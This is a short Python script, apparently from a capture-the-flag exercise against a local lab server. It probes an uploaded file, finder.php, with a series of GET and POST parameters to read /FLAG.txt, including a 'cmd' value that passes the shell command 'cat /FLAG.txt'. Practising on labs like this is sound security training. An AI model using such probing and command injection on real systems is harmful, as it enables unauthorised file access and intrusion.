import requests

base_url = "http://127.0.0.1:32891"

# The finder.php is currently listing '/' directory
# I need to pass a parameter to read FLAG.txt or navigate to it

print("[+] Testing finder.php with parameters to read FLAG.txt...")

# Try common parameter names to interact with finder.php
params_to_test = [
    {'file': '/FLAG.txt'},
    {'path': '/FLAG.txt'},
    {'f': '/FLAG.txt'},
    {'read': '/FLAG.txt'},
    {'cat': '/FLAG.txt'},
    {'cmd': 'cat /FLAG.txt'},
    {'action': 'read', 'file': '/FLAG.txt'},
]

for params in params_to_test:
    resp = requests.get(f"{base_url}/posts/uploads/finder.php", params=params)
    print(f"\nParams: {params}")
    print(f"Status: {resp.status_code}")
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG:")
        print(resp.text)
        break
    else:
        print(f"Response (first 200 chars): {resp.text[:200]}")

# Also try POST method
print("\n[+] Testing POST method...")
resp = requests.post(f"{base_url}/posts/uploads/finder.php", data={'file': '/FLAG.txt'})
if "FLAG{" in resp.text:
    print(f"[!!!] FOUND FLAG VIA POST:")
    print(resp.text)
else:
    print(f"POST response (first 200 chars): {resp.text[:200]}")

